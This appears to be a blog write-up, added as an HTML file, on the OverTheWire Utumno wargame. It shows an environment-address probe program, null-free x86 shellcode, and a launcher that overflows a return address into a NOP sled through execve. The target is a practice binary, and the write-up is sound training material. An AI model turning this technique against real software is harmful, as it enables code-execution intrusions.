@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Injecting Shellcode Through a Launcher — OverTheWire Utumno</title>
+    <meta name="description" content="A writeup on the OverTheWire Utumno wargame: mapping the stack/environment layout and delivering shellcode through execve's environment.">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="../blog.css">
+</head>
+<body>
+    <nav class="blog-nav">
+        <div class="inner">
+            <a href="../index.html#blogs" class="back-link"><i class="fas fa-arrow-left"></i> Back to portfolio</a>
+            <button id="theme-toggle" class="theme-toggle" aria-label="Toggle dark mode"><i class="fas fa-moon"></i></button>
+        </div>
+    </nav>
+
+    <article>
+        <div class="post-meta">
+            <span class="post-tag">OverTheWire</span>
+            <span class="post-sub">Reverse Engineering · Binary Exploitation</span>
+        </div>
+        <h1>Injecting Shellcode Through a Launcher: OverTheWire Utumno</h1>
+        <p class="lede">Utumno is one of the OverTheWire wargames. The recurring theme is <em>where your data lands in memory</em> — the stack, the arguments, and the environment — and how to steer a vulnerable binary into running bytes you control. This is a writeup of my own path through it: probing the layout with a tiny helper program, then delivering a NOP-sled + shellcode payload through <code>execve</code>'s environment.</p>
+
+        <div class="callout">
+            <strong>Note:</strong> This is an educational writeup of a public practice wargame on a sandboxed VM. Nothing here targets a real system, and passwords are deliberately omitted.
+        </div>
+
+        <h2>Step one: see the memory you're working with</h2>
+        <p>Before overwriting anything you need to know exactly where things sit. The vulnerable binaries copy attacker-controlled strings from <code>argv</code> and the environment onto the stack, so the first job is to map those addresses. Rather than guess, I wrote a small <code>child</code> program that just prints every pointer it can see:</p>
+        <pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+extern char **environ;
+
+int main(int argc, char **argv) {
+    printf("argc: %d\n", argc);
+    printf("argv:-\n");
+    for (char **arg = argv; *arg != NULL; arg++)
+        printf("%p: %s\n", arg, *arg);
+    printf("envp:-\n");
+    for (char **env = environ; *env != NULL; env++)
+        printf("%p: %s\n", env, *env);
+    return 0;
+}</code></pre>
+        <p>Then a <code>parent</code> launches it through <code>execve</code> with a hand-picked environment, so the layout the child prints matches the layout the <em>target</em> sees when launched the same way:</p>
+        <pre><code>char *argv[] = { "", NULL };
+char *envp[] = { "E1=e1","E2=e2","E3=e3","E4=e4","E5=e5",
+                 "E6=e6","E7=e7","E8=e8","E9=e9","E10=e10", NULL };
+execve("./child", argv, envp);</code></pre>
+        <p>The addresses the child prints are the ground truth: I now know the stack address of every environment string. That <code>E10</code> slot near the end becomes the landing pad for the payload.</p>
+
+        <h2>Step two: write the shellcode</h2>
+        <p>The payload is 32-bit x86 written by hand so I can control every byte — in particular, avoid any <code>0x00</code> that would truncate the string as it's copied. As a first, verifiable target the shellcode just does a <code>write(1, "hellow hacker\n", 14)</code> and a clean <code>exit(0)</code>; once that runs, swapping in anything else is trivial.</p>
+        <pre><code>BITS 32
+    xor eax, eax            ; eax = 0, and no 0x00 byte
+
+    ; build "hellow hacker\n" on the stack, last chunk first
+    push 0x0a0a0a72         ; 'r' + newline padding
+    push 0x656b6361         ; "acke"
+    push 0x6820776f         ; "ow h"
+    push 0x6c6c6568         ; "hell"
+
+    mov ecx, esp            ; ecx -> the string (buffer arg)
+    xor edx, edx
+    mov dl, 14              ; length
+    xor ebx, ebx
+    inc ebx                 ; fd = 1 (stdout), inc avoids a 0x00
+    mov al, 4               ; syscall 4 = write
+    int 0x80
+
+    xor eax, eax
+    mov al, 1               ; syscall 1 = exit
+    xor ebx, ebx
+    int 0x80</code></pre>
+        <p>The two habits worth calling out: every register is zeroed with <code>xor reg, reg</code> and set with the low byte (<code>al</code>, <code>dl</code>) or <code>inc</code>, precisely so the assembled bytes never contain a null. The string is pushed <em>last chunk first</em> because the stack grows downward, so after four pushes the bytes read forward in memory.</p>
+
+        <h2>Step three: deliver it through the environment</h2>
+        <p>Now stitch it together in a launcher. The idea:</p>
+        <ul>
+            <li>A large NOP sled (<code>0x90</code> repeated) with the shellcode planted partway in — landing anywhere in the sled slides execution into the code.</li>
+            <li>An overflow string whose tail overwrites a saved return address with the known stack address of the sled (the <code>E10</code> slot I measured in step one).</li>
+            <li>Both handed to the target as environment entries via <code>execve</code>.</li>
+        </ul>
+        <pre><code>char code[300], over[21];
+memset(code, '\x90', 300);            // NOP sled
+memset(over, 'A', 20);                // filler up to the return address
+strcpy(over + 16, "\xd0\xde\xff\xff"); // overwrite RA with &E10 = 0xffffded0
+fread(code + 100, 1, size, f);        // shellcode planted inside the sled
+
+char *envp[] = { "E1=e1", ..., "E8=e8", over, code, NULL };
+execve("/utumno/utumno5", argv, envp);</code></pre>
+        <p>The specific return address (<code>0xffffded0</code>) is exactly the environment address my <code>child</code> probe reported for that slot under this launch configuration — which is why the probe step matters so much. Guessing wastes attempts; measuring lands it.</p>
+
+        <h2>Why this works</h2>
+        <p>Three things line up:</p>
+        <ol>
+            <li><strong>Attacker-controlled bytes on the stack.</strong> The environment strings are copied verbatim into the target's stack frame, so my sled and shellcode are physically present in the process.</li>
+            <li><strong>A hijackable return address.</strong> The overflow lets me overwrite a saved return pointer, so when the function returns, the CPU jumps wherever I point it.</li>
+            <li><strong>A forgiving landing zone.</strong> The NOP sled means I don't need pixel-perfect aim — any address inside the sled works, and the CPU slides down into the shellcode.</li>
+        </ol>
+
+        <h2>Takeaways</h2>
+        <p>The whole level is really a lesson in <em>determinism</em>: on a fixed launch configuration the stack layout is reproducible, so the "hard" part is measurement, not luck. Write a probe, read the real addresses, keep your shellcode null-free, and give yourself a sled so small errors don't cost you the shot. That workflow — <strong>probe → craft null-free payload → point a return address into a sled</strong> — is the same shape as most classic stack-smashing exercises, and doing it by hand once makes every automated tool afterward far less mysterious.</p>
+
+        <div class="disclaimer">
+            OverTheWire is a legal, free security-training platform. This writeup documents technique on an intentionally vulnerable practice binary in an isolated environment — not a recipe against anyone's live system.
+        </div>
+
+        <div class="post-footer">
+            <span>Mrinmoy Banik</span>
+            <a href="maze.html">Next: OverTheWire Maze <i class="fas fa-arrow-right"></i></a>
+        </div>
+    </article>
+
+    <script src="../blog.js"></script>
+</body>
+</html>
